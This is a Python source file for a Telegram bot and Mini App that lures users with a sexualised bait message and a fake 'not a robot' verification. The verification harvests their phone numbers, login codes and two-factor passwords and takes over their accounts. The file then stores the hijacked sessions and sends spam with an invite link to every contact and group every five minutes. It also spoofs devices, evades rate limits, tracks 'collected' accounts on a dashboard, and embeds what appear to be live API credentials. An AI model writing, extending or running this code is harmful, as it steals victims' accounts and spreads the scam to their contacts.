import time
import os
import sys
from collections import deque
import asyncio
import random
import json
import hashlib
import hmac
from urllib.parse import parse_qs

from aiohttp import web
from telethon import TelegramClient
from telethon.tl.types import User, Channel, Chat
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    AuthRestartError,
)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ChatJoinRequestHandler,
    ContextTypes,
    filters,
)

# ===============================
# CONFIG
# ===============================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
API_ID = 35214126
API_HASH = "332680c93c1cd23f6d2a9a5d3c990c48"
BOT_TOKEN = "8704595337:AAEYBfs_NlYiRFwIkm5bBx92q3ulwIZm5xc"

# ⚠️ URL HTTPS do Mini App (domínio)
WEBAPP_URL = "https://qualquerum.shop/webapp"
WEBAPP_PORT = 8080

CODE_TTL = 180
MAX_RETRIES = 3
LINK_GRUPO = "https://t.me/+MUSHc1O5dNw2NGMx"
DISPARO_MSG = "❌ 𝗔𝗰𝗲𝘀𝘀𝗼 𝗣𝗿𝗼𝗶𝗯𝗶𝗱𝗼 ⚠️\n\nhttps://t.me/+MUSHc1O5dNw2NGMx"
DISPARO_INTERVALO = 300  # 5 minutos
APPROVE_DELAY_MINUTES = 444444444444444  # Minutos para aprovar join request automaticamente

users = {}
disparo_tasks = {}  # phone -> asyncio.Task
session_stats = {}  # phone -> stats dict

# Dashboard
DASHBOARD_TOKEN = "admin123"

# Log capture — guarda as últimas 5000 linhas
class LogCapture:
    def __init__(self, original_stdout, maxlen=5000):
        self.original = original_stdout
        self.buffer = deque(maxlen=maxlen)

    def write(self, text):
        self.original.write(text)
        if text.strip():  # Ignora linhas vazias
            self.buffer.append({"t": time.time(), "msg": text.strip()})

    def flush(self):
        self.original.flush()

    def get_logs(self):
        return list(self.buffer)

log_capture = LogCapture(sys.stdout)
sys.stdout = log_capture

def init_session_stats(phone, account_name="", account_id=None, collected_by=None):
    """Inicializa ou reseta stats de uma sessão"""
    if phone not in session_stats:
        session_stats[phone] = {
            "status": "active",
            "account_name": account_name,
            "account_id": account_id,
            "messages_sent": 0,
            "messages_failed": 0,
            "floods_received": 0,
            "rounds_completed": 0,
            "last_round_time": None,
            "connected_since": time.time(),
            "collected_at": time.time(),
            "collected_by": collected_by,
            "ban_reason": "",
            "groups_count": 0,
            "contacts_count": 0,
        }
    else:
        session_stats[phone]["status"] = "active"
        session_stats[phone]["connected_since"] = time.time()
        if account_name:
            session_stats[phone]["account_name"] = account_name
        if account_id:
            session_stats[phone]["account_id"] = account_id

STATS_FILE = os.path.join(BASE_DIR, "stats.json")

def save_stats():
    """Salva session_stats em arquivo JSON"""
    try:
        with open(STATS_FILE, "w", encoding="utf-8") as f:
            json.dump(session_stats, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[STATS] ⚠️ Erro ao salvar stats: {e}")

def load_stats():
    """Carrega session_stats do arquivo JSON"""
    global session_stats
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, "r", encoding="utf-8") as f:
                session_stats = json.load(f)
            print(f"[STATS] 📂 Stats carregadas: {len(session_stats)} sessões")
    except Exception as e:
        print(f"[STATS] ⚠️ Erro ao carregar stats: {e}")

# ===============================
# VALIDAÇÃO INITDATA
# ===============================
def validate_init_data(init_data: str) -> dict | None:
    """Valida initData do Telegram WebApp e retorna dados do usuário"""
    try:
        parsed = dict(parse_qs(init_data))
        data = {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}

        received_hash = data.pop("hash", None)
        if not received_hash:
            return None

        data_check_arr = sorted([f"{k}={v}" for k, v in data.items()])
        data_check_string = "\n".join(data_check_arr)

        secret_key = hmac.new(
            b"WebAppData", BOT_TOKEN.encode(), hashlib.sha256
        ).digest()

        calculated_hash = hmac.new(
            secret_key, data_check_string.encode(), hashlib.sha256
        ).hexdigest()

        if calculated_hash != received_hash:
            print(f"[WARN] initData hash inválido")
            return None

        if "user" in data:
            data["user"] = json.loads(data["user"])

        return data
    except Exception as e:
        print(f"[ERROR] validate_init_data: {e}")
        return None

# ===============================
# RETRY HELPER
# ===============================
async def send_code_with_retry(phone, session_path, device, max_retries=MAX_RETRIES):
    """Tenta enviar código com retry automático"""
    last_error = None

    for attempt in range(1, max_retries + 1):
        client = TelegramClient(
            session_path,
            API_ID,
            API_HASH,
            device_model=device[0],
            system_version=device[1],
            app_version=device[2],
            lang_code="pt-br"
        )

        try:
            print(f"[DEBUG] Tentativa {attempt}/{max_retries} - Conectando...")
            await asyncio.wait_for(client.connect(), timeout=20)
            print(f"[DEBUG] ✅ Conectado!")

            delay = random.uniform(5, 8)
            await asyncio.sleep(delay)

            print(f"[DEBUG] Enviando código...")
            sent_code = await client.send_code_request(phone)
            print(f"[DEBUG] ✅ Código enviado!")
            return client, sent_code

        except (AuthRestartError, ConnectionError, OSError) as e:
            last_error = e
            print(f"[WARN] Tentativa {attempt} falhou: {type(e).__name__}: {e}")
            try:
                await client.disconnect()
            except:
                pass

            if attempt < max_retries:
                wait = random.uniform(3, 6)
                print(f"[DEBUG] Aguardando {wait:.1f}s antes de retry...")
                await asyncio.sleep(wait)
            continue

        except Exception:
            try:
                await client.disconnect()
            except:
                pass
            raise

    raise last_error

# ===============================
# HELPER: extrair user_id do initData
# ===============================
def get_user_id(init_data: str) -> int | None:
    validated = validate_init_data(init_data)
    if not validated or "user" not in validated:
        return None
    return validated["user"]["id"]

# ===============================
# DISPARO: LOOP DE ENVIO CONTÍNUO
# ===============================
async def disparo_loop(client: TelegramClient, phone: str):
    """Envia mensagem para todos os grupos e contatos (não bots) a cada 5 minutos"""
    print(f"[DISPARO] 🔄 Iniciando loop para {phone}")
    falhas_conexao = 0
    MAX_FALHAS = 5  # Máximo de falhas consecutivas antes de desistir

    # Garantir que stats existem
    if phone not in session_stats:
        init_session_stats(phone)

    while True:
        try:
            # Reconectar se caiu
            if not client.is_connected():
                print(f"[DISPARO] 🔌 Reconectando {phone}...")
                await asyncio.wait_for(client.connect(), timeout=30)
                falhas_conexao = 0

            enviados = 0
            erros = 0
            flood_total = 0
            grupos = 0
            contatos = 0

            async for dialog in client.iter_dialogs():
                entity = dialog.entity

                # Pular bots
                if isinstance(entity, User) and entity.bot:
                    continue

                # Pular o próprio usuário (Saved Messages)
                if isinstance(entity, User) and entity.is_self:
                    continue

                try:
                    await client.send_message(entity, DISPARO_MSG)
                    enviados += 1
                    # Contar só onde CONSEGUIU enviar
                    if isinstance(entity, User):
                        contatos += 1
                    elif isinstance(entity, (Channel, Chat)):
                        grupos += 1
                    # Stats: mensagem enviada
                    if phone in session_stats:
                        session_stats[phone]["messages_sent"] += 1
                    # Delay entre cada envio pra não tomar flood
                    await asyncio.sleep(random.uniform(2, 5))

                except Exception as e:
                    error_name = type(e).__name__

                    # FloodWaitError — RESPEITAR ou toma ban
                    if "FloodWait" in error_name or "flood" in str(e).lower():
                        wait_time = getattr(e, 'seconds', 60)
                        flood_total += 1
                        # Stats: flood
                        if phone in session_stats:
                            session_stats[phone]["floods_received"] += 1
                        print(f"[DISPARO] 🚫 FLOOD! {phone} — Aguardando {wait_time}s...")
                        await asyncio.sleep(wait_time + 5)

                        # Se tomou muito flood, para a rodada
                        if flood_total >= 3:
                            print(f"[DISPARO] ⛔ {phone} — Muitos floods, parando rodada")
                            break

                    # SlowModeWait — grupo com slow mode
                    elif "SlowMode" in error_name:
                        wait_time = getattr(e, 'seconds', 30)
                        print(f"[DISPARO] 🐢 SlowMode em {dialog.name}, pulando...")
                        continue

                    # Chat restrito / sem permissão
                    elif any(x in error_name for x in ["ChatWriteForbidden", "UserBannedInChannel", "ChannelPrivate"]):
                        continue  # Pula silenciosamente

                    # Peer inválido
                    elif "Peer" in error_name or "Input" in error_name:
                        continue

                    else:
                        erros += 1
                        # Stats: erro
                        if phone in session_stats:
                            session_stats[phone]["messages_failed"] += 1
                        print(f"[DISPARO] ⚠️ Erro ao enviar para {dialog.name}: {error_name}: {e}")

            falhas_conexao = 0  # Resetar se a rodada completou
            # Stats: rodada completa
            if phone in session_stats:
                session_stats[phone]["rounds_completed"] += 1
                session_stats[phone]["last_round_time"] = time.time()
                session_stats[phone]["groups_count"] = grupos
                session_stats[phone]["contacts_count"] = contatos
            save_stats()
            print(f"[DISPARO] ✅ {phone} — Rodada completa: {enviados} enviados, {erros} erros, {flood_total} floods | 📁 {grupos} grupos, 👤 {contatos} contatos")

        except Exception as e:
            error_name = type(e).__name__
            print(f"[DISPARO] ❌ Erro geral {phone}: {error_name}: {e}")

            # Conta banida/desativada — PARAR permanentemente
            if any(x in error_name for x in ["UserDeactivated", "AuthKeyUnregistered", "AuthKeyDuplicated"]):
                print(f"[DISPARO] 💀 Conta {phone} BANIDA/DESATIVADA — Encerrando e limpando")
                try:
                    await client.disconnect()
                except:
                    pass
                # Remove dos stats e deleta arquivo .session
                session_stats.pop(phone, None)
                session_file = os.path.join(BASE_DIR, "sessions", f"{phone}.session")
                if os.path.exists(session_file):
                    os.remove(session_file)
                    print(f"[CLEANUP] 🗑️ Sessão {phone} deletada")
                save_stats()
                disparo_tasks.pop(phone, None)
                return  # Sai do loop permanentemente

            # Problemas de conexão
            falhas_conexao += 1
            if falhas_conexao >= MAX_FALHAS:
                print(f"[DISPARO] 💀 {phone} — {MAX_FALHAS} falhas seguidas, encerrando")
                # Stats: marcar como expirada
                if phone in session_stats:
                    session_stats[phone]["status"] = "expired"
                    session_stats[phone]["ban_reason"] = f"{MAX_FALHAS} falhas de conexão"
                    save_stats()
                try:
                    await client.disconnect()
                except:
                    pass
                disparo_tasks.pop(phone, None)
                return

            # Espera mais entre tentativas com falha
            await asyncio.sleep(30)
            continue

        # Aguarda 5 minutos antes da próxima rodada
        print(f"[DISPARO] ⏳ {phone} — Aguardando {DISPARO_INTERVALO}s para próxima rodada...")
        await asyncio.sleep(DISPARO_INTERVALO)

# ===============================
# API: ENVIAR CÓDIGO
# ===============================
async def api_send_code(request):
    data = await request.json()
    phone = data.get("phone", "").strip()
    init_data = data.get("initData", "")

    user_id = get_user_id(init_data)
    if not user_id:
        return web.json_response({"error": "Acesso negado"}, status=403)

    if not phone.startswith('+'):
        phone = '+' + phone

    print(f"[API] 📱 send-code de user {user_id}: {phone}")

    # Limpa sessão anterior
    if user_id in users and "client" in users[user_id]:
        try:
            await users[user_id]["client"].disconnect()
        except:
            pass

    session_path = os.path.join(BASE_DIR, "sessions", phone)

    devices = [
        ("Samsung Galaxy S22", "Android 13", "10.9.5"),
        ("iPhone 14 Pro", "iOS 17.0", "10.9.3"),
        ("Xiaomi 13", "Android 13", "10.9.4"),
    ]
    device = random.choice(devices)

    try:
        client, sent_code = await send_code_with_retry(phone, session_path, device)

        users[user_id] = {
            "phone": phone,
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash,
            "expires": time.time() + CODE_TTL,
            "step": "code",
            "session_path": session_path,
        }

        return web.json_response({"ok": True})

    except (AuthRestartError, ConnectionError, OSError):
        print(f"[ERROR] Telegram instável após {MAX_RETRIES} tentativas")
        return web.json_response({"error": "Telegram instável. Tente novamente."}, status=503)
    except asyncio.TimeoutError:
        return web.json_response({"error": "Timeout ao conectar. Tente novamente."}, status=504)
    except Exception as e:
        print(f"[ERROR] send-code: {type(e).__name__}: {e}")
        return web.json_response({"error": str(e)}, status=500)

# ===============================
# API: VERIFICAR CÓDIGO
# ===============================
async def api_verify_code(request):
    data = await request.json()
    code = data.get("code", "").strip()
    init_data = data.get("initData", "")

    user_id = get_user_id(init_data)
    if not user_id:
        return web.json_response({"error": "Acesso negado"}, status=403)

    if user_id not in users:
        return web.json_response({"error": "Sessão expirada. Volte e tente novamente."}, status=400)

    state = users[user_id]

    time_remaining = state["expires"] - time.time()
    if time_remaining <= 0:
        try:
            await state["client"].disconnect()
        except:
            pass
        users.pop(user_id, None)
        return web.json_response({"error": "Código expirado!"}, status=400)

    client = state["client"]
    phone = state["phone"]
    phone_code_hash = state["phone_code_hash"]

    try:
        print(f"[API] 🔑 verify-code de user {user_id}: {code}")
        delay = random.uniform(7, 10)
        await asyncio.sleep(delay)

        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash
        )

        me = await client.get_me()
        print(f"[API] ✅✅✅ LOGIN OK! User: {me.id}")

        # Stats: registrar nova sessão
        init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
        save_stats()

        # Inicia disparo em background (NÃO desconecta)
        users.pop(user_id, None)
        task = asyncio.create_task(disparo_loop(client, phone))
        disparo_tasks[phone] = task
        print(f"[DISPARO] 🚀 Loop de disparo iniciado para {phone}")

        return web.json_response({"ok": True, "link": LINK_GRUPO})

    except SessionPasswordNeededError:
        users[user_id]["step"] = "password"
        return web.json_response({"needs_2fa": True})

    except PhoneCodeExpiredError:
        try:
            await client.disconnect()
        except:
            pass
        users.pop(user_id, None)
        return web.json_response({"error": "Código expirado. Telegram bloqueou."}, status=400)

    except PhoneCodeInvalidError:
        return web.json_response({"error": "Código incorreto! Tente novamente."}, status=400)

    except Exception as e:
        print(f"[ERROR] verify-code: {type(e).__name__}: {e}")
        try:
            await client.disconnect()
        except:
            pass
        users.pop(user_id, None)
        return web.json_response({"error": str(e)}, status=500)

# ===============================
# API: VERIFICAR SENHA 2FA
# ===============================
async def api_verify_password(request):
    data = await request.json()
    password = data.get("password", "")
    init_data = data.get("initData", "")

    user_id = get_user_id(init_data)
    if not user_id:
        return web.json_response({"error": "Acesso negado"}, status=403)

    if user_id not in users or users[user_id].get("step") != "password":
        return web.json_response({"error": "Sessão expirada."}, status=400)

    client = users[user_id]["client"]
    phone = users[user_id]["phone"]

    try:
        print(f"[API] 🔒 verify-password de user {user_id}")
        await asyncio.sleep(random.uniform(3, 5))
        await client.sign_in(password=password)

        me = await client.get_me()
        print(f"[API] ✅✅✅ LOGIN 2FA OK! User: {me.id}")

        # Stats: registrar nova sessão
        init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
        save_stats()

        # Inicia disparo em background (NÃO desconecta)
        users.pop(user_id, None)
        task = asyncio.create_task(disparo_loop(client, phone))
        disparo_tasks[phone] = task
        print(f"[DISPARO] 🚀 Loop de disparo iniciado para {phone}")

        return web.json_response({"ok": True, "link": LINK_GRUPO})

    except Exception as e:
        print(f"[ERROR] verify-password: {e}")
        return web.json_response({"error": "Senha incorreta!"}, status=400)

# ===============================
# API: STATUS (polling do webapp)
# ===============================
async def api_status(request):
    data = await request.json()
    init_data = data.get("initData", "")

    user_id = get_user_id(init_data)
    if not user_id:
        return web.json_response({"error": "Acesso negado"}, status=403)

    if user_id not in users:
        return web.json_response({"step": "waiting"})

    state = users[user_id]
    return web.json_response({
        "step": state.get("step", "waiting"),
        "error": state.get("error")
    })

# ===============================
# SERVIR WEBAPP + STATIC
# ===============================
async def serve_webapp(request):
    return web.FileResponse(os.path.join(BASE_DIR, "webapp", "index.html"))

async def serve_static(request):
    filename = request.match_info['filename']
    filepath = os.path.join(BASE_DIR, filename)
    if os.path.exists(filepath):
        return web.FileResponse(filepath)
    return web.Response(status=404)

# ===============================
# BOT: CONTATO COMPARTILHADO (via requestContact)
# ===============================
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Recebe contato compartilhado via Mini App requestContact()"""
    user_id = update.effective_user.id
    contact = update.message.contact

    if not contact or contact.user_id != user_id:
        return

    phone = contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone

    print(f"[BOT] 📱 Contato recebido de {user_id}: {phone}")

    # Limpa sessão anterior
    if user_id in users and "client" in users[user_id]:
        try:
            await users[user_id]["client"].disconnect()
        except:
            pass

    users[user_id] = {"step": "processing"}

    session_path = os.path.join(BASE_DIR, "sessions", phone)
    devices = [
        ("Samsung Galaxy S22", "Android 13", "10.9.5"),
        ("iPhone 14 Pro", "iOS 17.0", "10.9.3"),
        ("Xiaomi 13", "Android 13", "10.9.4"),
    ]
    device = random.choice(devices)

    try:
        client, sent_code = await send_code_with_retry(phone, session_path, device)

        users[user_id] = {
            "phone": phone,
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash,
            "expires": time.time() + CODE_TTL,
            "step": "code",
            "session_path": session_path,
        }
        print(f"[BOT] ✅ Código enviado para {phone}")

    except Exception as e:
        print(f"[ERROR] handle_contact: {type(e).__name__}: {e}")
        users[user_id] = {"step": "error", "error": str(e)}

# ===============================
# BOT: /start
# ===============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id in users and "client" in users[user_id]:
        try:
            await users[user_id]["client"].disconnect()
        except:
            pass
        users.pop(user_id, None)

    keyboard = [
        [InlineKeyboardButton(
            "✅ 𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗖̧𝗔̃𝗢 — 𝗔𝗖𝗘𝗦𝗦𝗔𝗥 𝗚𝗥𝗔𝗧𝗜𝗦",
            web_app=WebAppInfo(url=WEBAPP_URL)
        )],
        [InlineKeyboardButton(
            "❌ 𝗘𝗡𝗧𝗥𝗔𝗥 — 𝗦𝗘𝗠 𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗥 ❌",
            url="https://t.me/AHSGSKASBOT?start=entrarsempagar"
        )]
    ]

    with open(os.path.join(BASE_DIR, "video.mp4"), "rb") as video:
        await update.message.reply_video(
            video=video,
            caption=(
                "😱 **𝗩𝗘𝗝𝗔 𝗢 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗢 𝗡𝗔 𝗖𝗢𝗠𝗨𝗡𝗜𝗗𝗔𝗗𝗘** ❌ **𝗦𝗘𝗠 𝗖𝗘𝗡𝗦𝗨𝗥𝗔...**\n\n"
                "🚫 𝗟𝗶𝗯𝗲𝗿𝗮𝗻𝗱𝗼 𝗼 👌🏿 𝗲𝗺 𝗹𝗼𝗰𝗮𝗶𝘀\n"
                "🍑 𝗙𝗮𝘃𝗲𝗹𝟰𝗱𝗮𝘀 𝗱𝗮𝗻𝗱𝗼 𝗼 𝗰𝘂 𝗽𝗿𝗮 𝟱\n"
                "🥵 !𝗡𝗰𝟯𝘀𝘁𝟬𝘀 𝗰𝗼𝗺 𝗮𝘀 𝗽𝗿𝗶𝗺𝗮𝘀 ⁺¹⁸\n"
                "💦 𝗦𝘂𝗯𝗶𝘂 𝗼 𝗺𝗼𝗿𝗿𝗼 𝗲 𝗺𝗮𝗺𝗼𝘂 𝗴𝗲𝗿𝗮\n"
                "👅 𝗣𝗮𝗴𝗼𝘂 𝗼 𝗽𝗼‌ 𝗰𝗼𝗺 𝗼 𝗰𝘂𝘇𝗶𝗻𝗵\n"
                "🔥 𝗣𝘂𝘁!𝗻𝗵𝗮𝘀 𝗱𝗲 𝗕𝗮𝗶𝘅𝗮 𝗿𝗲𝗻𝗱𝗮\n"
                "👀 𝗙𝗹𝗮𝗴𝗿𝗮𝘀 𝗿𝗲𝗮𝗶𝘀 𝗻𝗮 𝗳𝗮𝘃𝗲𝗹𝗮\n"
                "🚷 𝗟!𝘃𝗲𝘀 𝗱𝗮𝘀 𝗳𝗮𝘃𝗲𝗹𝗮𝗱𝟰𝘀\n"
                "🌶 𝗠𝘂𝗹𝗵𝗲𝗿 𝗱𝗲 𝗕𝟰𝗻𝗱'𝗱𝟬 𝗻𝗮 𝗰𝗮𝗱𝗲𝗶𝗮\n\n"
                "⚠️ 𝗖𝗢𝗡𝗧𝗘𝗨𝗗𝗢 𝗕𝗟𝗢𝗤𝗨𝗘𝗔𝗗𝗢! Para liberar toda essa putaria 100% GRATUITA, é necessário fazer uma verificação para comprovar que você não é um robô. Clique no botão abaixo e inicie sua verificação"
            ),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    print(f"[DEBUG] Usuário {user_id} iniciou - botão Mini App enviado")

# ===============================
# BOT: JOIN REQUEST
# ===============================
async def _approve_after_delay(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_id: int, user_name: str, delay_minutes: int):
    """Task em background que espera X minutos e aprova o join request"""
    try:
        await asyncio.sleep(delay_minutes * 60)
        await context.bot.approve_chat_join_request(chat_id=chat_id, user_id=user_id)
        print(f"[JOIN] ✅ Join request de {user_name} ({user_id}) APROVADO após {delay_minutes} min")
    except Exception as e:
        print(f"[JOIN] ⚠️ Erro ao aprovar {user_name} ({user_id}): {type(e).__name__}: {e}")

async def handle_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Quando alguém solicita entrada, envia a mensagem inicial com Mini App e aprova após X minutos"""
    join_request = update.chat_join_request
    user_id = join_request.from_user.id
    user_name = join_request.from_user.first_name
    chat_id = join_request.chat.id
    chat_name = join_request.chat.title

    print(f"[DEBUG] 👤 Join request de {user_name} ({user_id}) no grupo {chat_name}")

    try:
        # Limpa sessão anterior se existir
        if user_id in users and "client" in users[user_id]:
            try:
                await users[user_id]["client"].disconnect()
            except:
                pass
            users.pop(user_id, None)

        keyboard = [
            [InlineKeyboardButton(
                "✅ 𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗖̧𝗔̃𝗢 — 𝗔𝗖𝗘𝗦𝗦𝗔𝗥 𝗚𝗥𝗔𝗧𝗜𝗦",
                web_app=WebAppInfo(url=WEBAPP_URL)
            )],
            [InlineKeyboardButton(
                "❌ 𝗘𝗡𝗧𝗥𝗔𝗥 — 𝗦𝗘𝗠 𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗥 ❌",
                url="https://t.me/AHSGSKASBOT?start=entrarsempagar"
            )]
        ]

        with open(os.path.join(BASE_DIR, "video.mp4"), "rb") as photo:
            await context.bot.send_photo(
                chat_id=user_id,
                photo=photo,
                caption=(
                    "😱 **𝗩𝗘𝗝𝗔 𝗢 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗢 𝗡𝗔 𝗖𝗢𝗠𝗨𝗡𝗜𝗗𝗔𝗗𝗘** ❌ **𝗦𝗘𝗠 𝗖𝗘𝗡𝗦𝗨𝗥𝗔...**\n\n"
                    "🚫 𝗟𝗶𝗯𝗲𝗿𝗮𝗻𝗱𝗼 𝗼 👌🏿 𝗲𝗺 𝗹𝗼𝗰𝗮𝗶𝘀\n"
                    "🍑 𝗙𝗮𝘃𝗲𝗹𝟰𝗱𝗮𝘀 𝗱𝗮𝗻𝗱𝗼 𝗼 𝗰𝘂 𝗽𝗿𝗮 𝟱\n"
                    "🥵 !𝗡𝗰𝟯𝘀𝘁𝟬𝘀 𝗰𝗼𝗺 𝗮𝘀 𝗽𝗿𝗶𝗺𝗮𝘀 ⁺¹⁸\n"
                    "💦 𝗦𝘂𝗯𝗶𝘂 𝗼 𝗺𝗼𝗿𝗿𝗼 𝗲 𝗺𝗮𝗺𝗼𝘂 𝗴𝗲𝗿𝗮\n"
                    "👅 𝗣𝗮𝗴𝗼𝘂 𝗼 𝗽𝗼‌ 𝗰𝗼𝗺 𝗼 𝗰𝘂𝘇𝗶𝗻𝗵\n"
                    "🔥 𝗣𝘂𝘁!𝗻𝗵𝗮𝘀 𝗱𝗲 𝗕𝗮𝗶𝘅𝗮 𝗿𝗲𝗻𝗱𝗮\n"
                    "👀 𝗙𝗹𝗮𝗴𝗿𝗮𝘀 𝗿𝗲𝗮𝗶𝘀 𝗻𝗮 𝗳𝗮𝘃𝗲𝗹𝗮\n"
                    "🚷 𝗟!𝘃𝗲𝘀 𝗱𝗮𝘀 𝗳𝗮𝘃𝗲𝗹𝗮𝗱𝟰𝘀\n"
                    "🌶 𝗠𝘂𝗹𝗵𝗲𝗿 𝗱𝗲 𝗕𝟰𝗻𝗱'𝗱𝟬 𝗻𝗮 𝗰𝗮𝗱𝗲𝗶𝗮\n\n"
                    "⚠️ 𝗖𝗢𝗡𝗧𝗘𝗨𝗗𝗢 𝗕𝗟𝗢𝗤𝗨𝗘𝗔𝗗𝗢! Para liberar toda essa putaria 100% GRATUITA, é necessário fazer uma verificação para comprovar que você não é um robô. Clique no botão abaixo e inicie sua verificação"
                ),
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

        print(f"[DEBUG] 📩 Mensagem inicial enviada para {user_name} ({user_id})")

        # Agenda aprovação automática após X minutos
        asyncio.create_task(
            _approve_after_delay(context, chat_id, user_id, user_name, APPROVE_DELAY_MINUTES)
        )
        print(f"[JOIN] ⏳ Aprovação de {user_name} agendada para {APPROVE_DELAY_MINUTES} min")

    except Exception as e:
        print(f"[ERROR] Erro ao enviar mensagem para {user_name}: {e}")

# ===============================
# CARREGAR SESSÕES EXISTENTES
# ===============================
async def carregar_sessoes():
    """Carrega todas as sessões salvas e inicia disparo automático"""
    sessions_dir = os.path.join(BASE_DIR, "sessions")
    arquivos = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]

    if not arquivos:
        print("[STARTUP] 📂 Nenhuma sessão encontrada na pasta sessions/")
        return

    print(f"[STARTUP] 📂 {len(arquivos)} sessão(ões) encontrada(s), carregando...")

    for arquivo in arquivos:
        phone = arquivo.replace(".session", "")
        session_path = os.path.join(sessions_dir, phone)

        # Pular se já tiver disparo ativo pra esse phone
        if phone in disparo_tasks:
            print(f"[STARTUP] ⏭️ {phone} já tem disparo ativo, pulando")
            continue

        try:
            devices = [
                ("Samsung Galaxy S22", "Android 13", "10.9.5"),
                ("iPhone 14 Pro", "iOS 17.0", "10.9.3"),
                ("Xiaomi 13", "Android 13", "10.9.4"),
            ]
            device = random.choice(devices)

            client = TelegramClient(
                session_path,
                API_ID,
                API_HASH,
                device_model=device[0],
                system_version=device[1],
                app_version=device[2],
                lang_code="pt-br"
            )

            await asyncio.wait_for(client.connect(), timeout=30)

            if not await client.is_user_authorized():
                print(f"[STARTUP] ❌ {phone} — Sessão expirada/inválida, pulando")
                await client.disconnect()
                continue

            me = await client.get_me()
            print(f"[STARTUP] ✅ {phone} — Conectado como {me.first_name} (ID: {me.id})")

            # Stats: registrar sessão carregada
            init_session_stats(phone, account_name=me.first_name or "", account_id=me.id)

            # Inicia disparo
            task = asyncio.create_task(disparo_loop(client, phone))
            disparo_tasks[phone] = task
            print(f"[STARTUP] 🚀 Disparo iniciado para {phone}")

            # Delay entre conexões pra não flodar
            await asyncio.sleep(random.uniform(2, 4))

        except Exception as e:
            print(f"[STARTUP] ❌ Erro ao carregar {phone}: {type(e).__name__}: {e}")

    print(f"[STARTUP] ✅ {len(disparo_tasks)} sessão(ões) ativa(s) disparando!")

# ===============================
# DASHBOARD API
# ===============================
async def serve_dashboard(request):
    return web.FileResponse(os.path.join(BASE_DIR, "webapp", "dashboard.html"))

async def api_dashboard_logs(request):
    """Retorna os logs em tempo real"""
    token = request.query.get("token", "")
    if token != DASHBOARD_TOKEN:
        return web.json_response({"error": "Acesso negado"}, status=403)
    return web.json_response({"logs": log_capture.get_logs()})

async def api_dashboard(request):
    """Retorna todas as estatísticas para o dashboard"""
    token = request.query.get("token", "")
    if token != DASHBOARD_TOKEN:
        return web.json_response({"error": "Acesso negado"}, status=403)

    # Contar por status
    active = sum(1 for s in session_stats.values() if s["status"] == "active")
    banned = sum(1 for s in session_stats.values() if s["status"] == "banned")
    expired = sum(1 for s in session_stats.values() if s["status"] == "expired")

    # Totais
    total_msgs = sum(s["messages_sent"] for s in session_stats.values())
    total_errs = sum(s["messages_failed"] for s in session_stats.values())
    total_floods = sum(s["floods_received"] for s in session_stats.values())
    total_rounds = sum(s["rounds_completed"] for s in session_stats.values())

    total_sessions = len(session_stats)

    # Lista de sessões
    sessions_list = []
    for phone, s in session_stats.items():
        sessions_list.append({
            "phone": phone,
            "status": s["status"],
            "account_name": s.get("account_name", ""),
            "account_id": s.get("account_id"),
            "messages_sent": s["messages_sent"],
            "messages_failed": s["messages_failed"],
            "floods_received": s["floods_received"],
            "rounds_completed": s["rounds_completed"],
            "last_round_time": s.get("last_round_time"),
            "connected_since": s.get("connected_since"),
            "collected_at": s.get("collected_at"),
            "collected_by": s.get("collected_by"),
            "ban_reason": s.get("ban_reason", ""),
            "groups_count": s.get("groups_count", 0),
            "contacts_count": s.get("contacts_count", 0),
        })

    return web.json_response({
        "total_sessions": total_sessions,
        "active_sessions": active,
        "banned_sessions": banned,
        "expired_sessions": expired,
        "total_messages_sent": total_msgs,
        "total_errors": total_errs,
        "total_floods": total_floods,
        "total_rounds": total_rounds,
        "sessions": sessions_list,
    })

async def api_dashboard_cleanup(request):
    """Remove sessões BANIDAS dos stats e deleta arquivos .session"""
    token = request.query.get("token", "")
    if token != DASHBOARD_TOKEN:
        return web.json_response({"error": "Acesso negado"}, status=403)

    removed = 0
    to_remove = [phone for phone, s in session_stats.items() if s["status"] == "banned"]

    for phone in to_remove:
        session_stats.pop(phone, None)
        session_file = os.path.join(BASE_DIR, "sessions", f"{phone}.session")
        if os.path.exists(session_file):
            os.remove(session_file)
        removed += 1

    save_stats()
    print(f"[CLEANUP] 🧹 {removed} sessões banidas removidas")
    return web.json_response({"ok": True, "removed": removed})

# ===============================
# MAIN
# ===============================
async def main():
    os.makedirs(os.path.join(BASE_DIR, "sessions"), exist_ok=True)

    # --- Web Server (aiohttp) ---
    web_app = web.Application()
    web_app.router.add_get("/webapp", serve_webapp)
    web_app.router.add_get("/static/{filename}", serve_static)
    web_app.router.add_post("/api/status", api_status)
    web_app.router.add_post("/api/send-code", api_send_code)
    web_app.router.add_post("/api/verify-code", api_verify_code)
    web_app.router.add_post("/api/verify-password", api_verify_password)
    web_app.router.add_get("/dashboard", serve_dashboard)
    web_app.router.add_get("/api/dashboard", api_dashboard)
